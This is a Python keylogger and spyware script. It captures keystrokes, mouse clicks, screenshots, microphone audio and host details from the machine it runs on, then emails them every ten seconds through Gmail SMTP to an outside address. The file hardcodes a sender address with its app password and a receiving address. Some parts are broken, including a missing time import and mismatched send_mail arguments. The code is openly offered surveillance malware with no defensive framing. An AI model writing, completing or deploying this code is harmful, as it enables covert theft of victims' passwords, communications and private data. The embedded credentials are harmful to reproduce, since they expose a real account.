import logging
import os
import platform
import smtplib
import socket
import threading
from mailLogger import SendMail
import wave
from time import sleep
from pynput import keyboard
from pynput.keyboard import Listener
from pynput.mouse import Listener as MouseListener
import pyscreenshot
import sounddevice as sd
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from subprocess import call

# Configuration
EMAIL_ADDRESS = "krishkkr11903@gmail.com"
EMAIL_PASSWORD = "hkdb xioq bqwx ryct"
SEND_REPORT_EVERY = 10  # in seconds
SCREENSHOT_INTERVAL = 10  # in seconds
SCREENSHOT_DIR = './screenshots/'
MICROPHONE_DURATION = 10  # in seconds

# Ensure screenshot directory exists
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)


class KeyLogger:
    def __init__(self):
        self.log = "KeyLogger Started..."
        self.email = EMAIL_ADDRESS
        self.password = EMAIL_PASSWORD

    def append_log(self, string):
        self.log = self.log + string

    def on_move(self, x, y):
        self.append_log("Mouse moved to {} {}\n".format(x, y))

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.append_log("Mouse clicked at {} {}\n".format(x, y))

    def on_scroll(self, x, y, dx, dy):
        self.append_log("Mouse scrolled at {} {} (dx={}, dy={})\n".format(x, y, dx, dy))

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "
        self.append_log(current_key)

    def send_mail(self, message):
        sender = EMAIL_ADDRESS
        receiver = "djtechcrack88@gmail.com"

        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = "Keylogger Report"

        msg.attach(MIMEText(message, 'plain'))

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(sender, receiver, msg.as_string())
        server.quit()

    def report(self):
        self.send_mail("\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(SEND_REPORT_EVERY, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.append_log("\nHostname: {}\n".format(hostname))
        self.append_log("IP Address: {}\n".format(ip))
        self.append_log("Processor: {}\n".format(plat))
        self.append_log("System: {}\n".format(system))
        self.append_log("Machine: {}\n".format(machine))

    def microphone(self):
        fs = 44100
        seconds = MICROPHONE_DURATION
        obj = wave.open('sound.wav', 'w')
        obj.setnchannels(1)  # mono
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        obj.writeframesraw(myrecording)
        sd.wait()

        self.send_mail(message="Microphone recording", file_path='sound.wav')

    def take_screenshot(self):
        image = pyscreenshot.grab()
        image_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{int(time.time())}.png")
        image.save(image_path)
        self.send_mail(message="Screenshot captured", file_path=image_path)

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        mouse_listener = MouseListener(on_click=self.on_click, on_scroll=self.on_scroll)
        with keyboard_listener, mouse_listener:
            self.report()
            keyboard_listener.join()
            mouse_listener.join()

            # Clean up resources
            if os.path.exists('sound.wav'):
                os.remove('sound.wav')

class Screenshot:
    def __init__(self, path='./screenshot/', interval=10):
        self.path = path
        self.interval = interval
        self.image_number = 0
        self.create_directory()

    def create_directory(self):
        if not os.path.isdir(self.path):
            os.mkdir(self.path)

    def take_screenshot(self):
        image = pyscreenshot.grab()
        file_path = f"{self.path}Screenshot_{self.image_number}.png"
        image.save(file_path)
        self.image_number += 1

    def clean_directory(self):
        for file in os.listdir(self.path):
            os.remove(os.path.join(self.path, file))
        print('Files cleaned...')

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.take_screenshot()
            print('Screenshot taken')

    def report(self):
        SendMail()  # Assuming SendMail function sends an email with attached screenshots
        print('Mail sent')
        self.clean_directory()
        threading.Timer(self.interval, self.report).start()

    def start(self):
        with MouseListener(on_click=self.on_click) as listener:
            self.report()
            listener.join()
def main():
    screenshot = Screenshot()
    keylogger = KeyLogger()

    # Create threads for screenshot and keylogger
    screenshot_thread = threading.Thread(target=screenshot.start)
    keylogger_thread = threading.Thread(target=keylogger.run)

    # Start both threads
    screenshot_thread.start()
    keylogger_thread.start()

    # Wait for both threads to finish
    screenshot_thread.join()
    keylogger_thread.join()

if __name__ == "__main__":
    main()